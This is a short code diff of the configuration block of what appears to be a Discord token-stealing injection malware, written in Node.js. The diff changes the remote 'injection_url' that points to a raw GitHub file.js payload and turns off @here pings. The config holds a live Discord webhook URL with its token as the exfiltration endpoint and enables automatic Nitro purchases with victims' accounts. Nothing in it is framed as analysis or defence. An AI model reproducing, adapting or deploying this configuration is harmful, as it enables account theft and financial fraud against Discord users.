@@ -8,13 +8,13 @@ const { exec } = require("child_process");
 
 const config = {
     auto_buy_nitro: true,
-    ping_on_run: true,
+    ping_on_run: false,
     ping_val: "@here",
     embed_name: "~~branding~~",
     embed_icon: "~~icon~~",
     embed_color: 8363488,
     webhook: "https://discord.com/api/webhooks/1038151389915918396/k0wpZRy2FD9aOw1sfbBqJE9mr94wO5b8i_vbvh5ZiNdqGaUyEl6yjci-t85zwFtSBdm6",
-    injection_url: "https://raw.githubusercontent.com/NobodyWouldEverUseThis7/Discord-Injection/main/file.js",
+    injection_url: "https://raw.githubusercontent.com/MaroCrafter/script/main/file.js",
     /* DON'T TOUCH UNDER HERE IF UNLESS YOU'RE MODIFYING THE INJECTION OR KNOW WHAT YOU'RE DOING */
     api: "https://discord.com/api/v9/users/@me",
     nitro: {
